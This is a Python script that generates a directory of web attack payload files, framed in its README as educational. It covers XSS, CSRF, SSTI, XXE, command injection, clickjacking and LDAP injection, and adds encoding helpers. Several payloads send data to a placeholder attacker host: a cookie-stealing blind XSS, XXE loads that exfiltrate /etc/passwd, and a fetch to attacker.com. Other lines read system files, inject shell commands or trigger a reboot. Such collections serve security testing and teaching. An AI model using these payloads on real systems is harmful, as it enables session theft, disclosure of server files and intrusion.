import os

# Define the structure of the repository with folders and files
repository_structure = {
    "README.md": """
# Payloads Repository

This repository is for educational purposes only. It contains payloads and techniques for testing the security of web applications. **Use responsibly and ethically**.
""",
    "xss": {
        "xss_payloads.txt": "<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>",
        "xss_bypass_payloads.txt": "<svg/onload=alert`1`>\n<iframe src=\"javascript:alert(1)\"></iframe>",
        "blind_xss_payloads.txt": "<script>new Image().src='http://attacker.com/?cookie='+document.cookie;</script>",
        "zero_day_xss_payloads.txt": "<scrīpt>alert('Zero-day')</scrīpt>\n<svg/onload=alert(1)>"
    },
    "csrf": {
        "csrf_payloads.html": """
<form action="http://target.com/like" method="POST">
    <input type="hidden" name="post_id" value="123">
    <input type="submit">
</form>
<script>document.forms[0].submit();</script>
""",
        "csrf_ajax_payloads.html": """
<script>
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://target.com/update", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("param=value&anotherParam=value");
</script>
""",
        "csrf_social_media_payloads.html": """
<iframe src="https://facebook.com/like.php?href=https://attacker.com" style="opacity: 0;"></iframe>
"""
    },
    "ssti": {
        "jinja2_ssti_payloads.txt": "{{ 7*7 }}\n{{ config.items() }}",
        "twig_ssti_payloads.txt": "{{ 7*7 }}\n{{ _self.template_from_string(\"{{phpinfo()}}\").render() }}",
        "velocity_ssti_payloads.txt": "#set($x='')#foreach($a in $x.split(''))#set($x=$x+$a)#end $x.eval('ls')",
        "advanced_template_bypass.txt": "{{ self.template_from_string(\"<%= system('ls') %>\").render() }}"
    },
    "xxe": {
        "basic_xxe_payloads.xml": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
""",
        "ssrf_via_xxe_payloads.xml": """<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % ext SYSTEM "http://attacker.com/malicious.dtd">
%ext;
]>
<data>&send;</data>
""",
        "blind_xxe_exfiltration.xml": """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd">
]>
<foo>&xxe;</foo>
""",
        "advanced_obfuscated_xxe.txt": """<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
]>
<data>&xxe;</data>
"""
    },
    "command_injection": {
        "linux_command_injection.txt": "; cat /etc/passwd\n&& ls /home",
        "windows_command_injection.txt": "&& dir C:\\\n| whoami",
        "blind_command_injection.txt": "ping -c 5 attacker.com\nnslookup attacker.com",
        "zero_day_command_injection.txt": "$(sleep 10)\n$(reboot)"
    },
    "clickjacking": {
        "basic_clickjacking_payloads.html": """
<iframe src="http://victim.com" style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;"></iframe>
""",
        "social_media_clickjacking.html": """
<iframe src="https://facebook.com/like.php?href=https://attacker.com" style="opacity: 0;"></iframe>
""",
        "advanced_clickjacking_bypass.txt": """
<iframe src="http://victim.com" sandbox="allow-scripts allow-forms"></iframe>
"""
    },
    "ldap_injection": {
        "basic_ldap_injection.txt": "*)(uid=*))(|(uid=*\n*()|(cn=*))(&(password=*)",
        "advanced_bypass_ldap.txt": "*()|(userPassword=*)\n(&(objectClass=*)(cn=*admin*))"
    },
    "zero_day": {
        "zero_day_payloads.txt": "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\" onload=\"fetch('http://attacker.com')\"></body></foreignObject></svg>",
        "hypothetical_bypasses.txt": "<scr<script>ipt>alert('WAF bypass')</scr<script>ipt>",
        "obfuscation_methods.txt": "<scrīpt>alert('Zero-day')</scrīpt>"
    },
    "generators": {
        "payload_generator_scripts.py": """import base64

# Example payload encoder for XSS, SQLi, etc.
def encode_base64(payload):
    return base64.b64encode(payload.encode()).decode()

# Example usage
payload = "<script>alert('XSS')</script>"
print(encode_base64(payload))
""",
        "payload_encoder.py": """import urllib.parse

# URL encode a given payload
def url_encode(payload):
    return urllib.parse.quote(payload)

# Example usage
payload = "<script>alert('XSS')</script>"
print(url_encode(payload))
"""
    }
}

# Function to create the repository structure
def create_repository_structure(base_path, structure):
    for name, content in structure.items():
        path = os.path.join(base_path, name)
        if isinstance(content, dict):
            # Create directory and recursively create its contents
            os.makedirs(path, exist_ok=True)
            create_repository_structure(path, content)
        else:
            # Create a file with the provided content
            with open(path, "w") as file:
                file.write(content)

# Function to allow the user to customize the structure
def customize_structure(structure):
    print("Current structure overview:")
    for key in structure.keys():
        print(f"- {key}")
    add_more = input("Would you like to add more folders or files to the repository structure? (y/n): ").strip().lower()
    
    if add_more == 'y':
        while True:
            choice = input("Add a new folder (f) or file (fl)? Type 'done' to finish: ").strip().lower()
            if choice == 'done':
                break
            elif choice == 'f':
                folder_name = input("Enter the new folder name: ").strip()
                structure[folder_name] = {}
            elif choice == 'fl':
                folder_name = input("Enter the folder name where you want to add the file: ").strip()
                file_name = input("Enter the new file name: ").strip()
                file_content = input(f"Enter the content for {file_name} (or leave empty): ").strip()
                if folder_name in structure and isinstance(structure[folder_name], dict):
                    structure[folder_name][file_name] = file_content
                else:
                    print("Folder not found. Please add the folder first.")

# Allow user to customize the repository structure
customize_structure(repository_structure)

# Define the base path where the repository should be created
base_path = "payloads-repository"

# Create the repository structure
create_repository_structure(base_path, repository_structure)

print(f"Repository structure created at: {os.path.abspath(base_path)}")
